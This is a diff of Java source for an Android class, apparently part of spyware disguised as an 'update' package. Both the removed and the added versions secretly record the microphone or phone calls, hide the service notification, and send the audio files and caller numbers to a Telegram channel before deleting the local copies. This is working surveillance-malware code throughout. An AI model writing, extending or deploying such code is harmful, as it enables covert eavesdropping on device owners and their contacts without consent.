@@ -1,109 +1,105 @@
 package com.kasari.update;
 
-import android.app.*;
-import android.content.Intent;
+import android.content.Context;
 import android.media.MediaRecorder;
-import android.os.*;
-import androidx.core.app.NotificationCompat;
+import android.os.Environment;
 import java.io.File;
+import java.io.FileInputStream;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
-public class VoiceRecorder extends Service {
+public class VoiceRecorder {
 
-    public static final String ACTION_CALL = "com.kasari.update.RECORD_CALL";
-    public static final String ACTION_MIC  = "com.kasari.update.RECORD_MIC";
-    public static final String ACTION_STOP = "com.kasari.update.STOP_RECORD";
-    public static final String EXTRA_SECONDS = "seconds";
+    private static MediaRecorder mediaRecorder = null;
+    private static String currentFilePath = null;
+    private static boolean isRecording = false;
+    private static Context contextRef = null;
 
-    private MediaRecorder mRecorder;
-    private String mFile;
-    private String mNumber = "Unknown";
-    private String mType   = "Call";
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent == null) return START_NOT_STICKY;
-        String action = intent.getAction();
-
-        if (ACTION_STOP.equals(action)) {
-            stopRecording("📞 Call Recording");
-            return START_NOT_STICKY;
-        }
-
-        startForeground(9902, buildNotif());
-
-        if (ACTION_CALL.equals(action)) {
-            mNumber = intent.getStringExtra("number");
-            mType   = intent.getStringExtra("type");
-            if (mNumber == null) mNumber = "Unknown";
-            if (mType   == null) mType   = "Call";
-            startRecording();
-
-        } else if (ACTION_MIC.equals(action)) {
-            int sec = intent.getIntExtra(EXTRA_SECONDS, 30);
-            mNumber = "Mic";
-            startRecording();
-            new Handler().postDelayed(() -> stopRecording("🎙 Mic Recording (" + sec + "s)"),
-                sec * 1000L);
-        }
-        return START_NOT_STICKY;
-    }
-
-    private Notification buildNotif() {
-        return new NotificationCompat.Builder(this, BackgroundService.CH_ID)
-            .setSmallIcon(android.R.drawable.sym_def_app_icon)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setSilent(true).build();
-    }
-
-    private void startRecording() {
+    public static void startRecording(Context context, int maxDurationSeconds) {
         try {
-            mFile = getCacheDir().getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".3gp";
-            mRecorder = new MediaRecorder();
-            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            mRecorder.setAudioSamplingRate(16000);
-            mRecorder.setAudioEncodingBitRate(24000);
-            mRecorder.setOutputFile(mFile);
-            mRecorder.prepare();
-            mRecorder.start();
-        } catch (Exception e) {
-            TelegramController.sendMessage("❌ Recording error: " + e.getMessage());
-            stopSelf();
-        }
-    }
-
-    private void stopRecording(String caption) {
-        if (mRecorder != null) {
-            try { mRecorder.stop(); } catch (Exception ignored) {}
-            mRecorder.release();
-            mRecorder = null;
-        }
-        String filePath = mFile;
-        String cap = caption + "\nWith: " + mNumber;
-        new Thread(() -> {
-            if (filePath == null) return;
-            java.io.File f = new java.io.File(filePath);
-            if (f.exists() && f.length() > 500) {
-                TelegramController.sendFile(f, cap);
-                f.delete();
-            } else {
-                if (f.exists()) f.delete();
+            if (isRecording) {
+                stopRecording(context);
+                Thread.sleep(500);
             }
-        }).start();
-        stopForeground(true);
-        stopSelf();
-    }
-
-    @Override
-    public void onDestroy() {
-        if (mRecorder != null) {
-            try { mRecorder.stop(); mRecorder.release(); } catch (Exception ignored) {}
-            mRecorder = null;
+            
+            contextRef = context;
+            
+            File recordingsDir = new File(context.getCacheDir(), "recordings");
+            if (!recordingsDir.exists()) {
+                recordingsDir.mkdirs();
+            }
+            
+            String fileName = "rec_" + System.currentTimeMillis() + ".3gp";
+            currentFilePath = new File(recordingsDir, fileName).getAbsolutePath();
+            
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            mediaRecorder.setAudioSamplingRate(8000);
+            mediaRecorder.setAudioChannels(1);
+            mediaRecorder.setAudioEncodingBitRate(12200);
+            mediaRecorder.setOutputFile(currentFilePath);
+            mediaRecorder.setMaxDuration(maxDurationSeconds * 1000);
+            
+            mediaRecorder.setOnInfoListener((mr, what, extra) -> {
+                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
+                    stopRecording(context);
+                }
+            });
+            
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            isRecording = true;
+            
+            TelegramController.sendMessage(context, 
+                "🎤 Recording started... (max " + maxDurationSeconds + "s)");
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+            TelegramController.sendMessage(context, "🎤 Recording failed to start");
         }
-        super.onDestroy();
     }
 
-    @Override public IBinder onBind(Intent i) { return null; }
+    public static void stopRecording(Context context) {
+        try {
+            if (mediaRecorder != null) {
+                try {
+                    mediaRecorder.stop();
+                } catch (Exception ignored) {}
+                mediaRecorder.release();
+                mediaRecorder = null;
+            }
+            
+            if (isRecording && currentFilePath != null) {
+                isRecording = false;
+                
+                File file = new File(currentFilePath);
+                if (file.exists() && file.length() > 0) {
+                    FileInputStream fis = new FileInputStream(file);
+                    byte[] audioBytes = new byte[(int) file.length()];
+                    fis.read(audioBytes);
+                    fis.close();
+                    
+                    String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
+                        Locale.getDefault()).format(new Date());
+                    
+                    TelegramController.sendAudio(context, audioBytes, 
+                        "🎤 Audio Recording\nTime: " + timestamp);
+                    
+                    file.delete();
+                }
+            }
+            
+            TelegramController.sendMessage(context, "🎤 Recording stopped");
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static boolean isRecording() {
+        return isRecording;
+    }
 }
